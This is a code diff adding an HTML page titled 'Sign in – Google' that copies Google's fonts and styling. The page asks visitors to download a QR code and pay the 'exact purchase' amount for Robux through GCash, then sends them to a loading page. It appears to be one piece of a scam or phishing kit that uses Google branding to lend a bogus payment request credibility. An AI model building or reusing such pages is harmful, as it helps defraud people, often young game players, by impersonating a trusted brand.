@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Google</title>
+  
+  <!-- Google Sans via Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans+Text:wght@400;500;700&display=swap" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <style>
+    body {
+        font-family: 'Google Sans Text', sans-serif;
+      background-color: #f1f3f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .card-style {
+      border-radius: 20px;
+      padding: 40px;
+      background-color: white;
+      max-width: 500px;
+      margin: 80px auto;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .btn-primary {
+      background-color: #1a73e8;
+      border: none;
+      border-radius: 20px;
+      padding: 8px 30px;
+      font-weight: 500;
+    }
+
+    .btn-primary:hover {
+      background-color: #1967d2;
+    }
+
+    @media (max-width: 768px) {
+      .card-style {
+        padding: 30px 20px;
+        margin: 30px 15px;
+        border-radius: 12px;
+        box-shadow: none;
+      }
+
+      body {
+        background-color: white;
+    
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card-style">
+    <h4 class="mb-1">Download Your QR Code</h4>
+    <p>Send the exact purchase using this qr on Gcash</p>
+    <a href="your-qr-code.png" download="robux-payment-qr.png">
+      <button class="btn btn-primary" onclick="donePurchase()">Download QR</button>
+    </a>
+  </div>
+
+  <script>
+    function donePurchase() {
+      window.location.href = "loading.html";
+    }
+  </script>
+
+</body>
+</html>
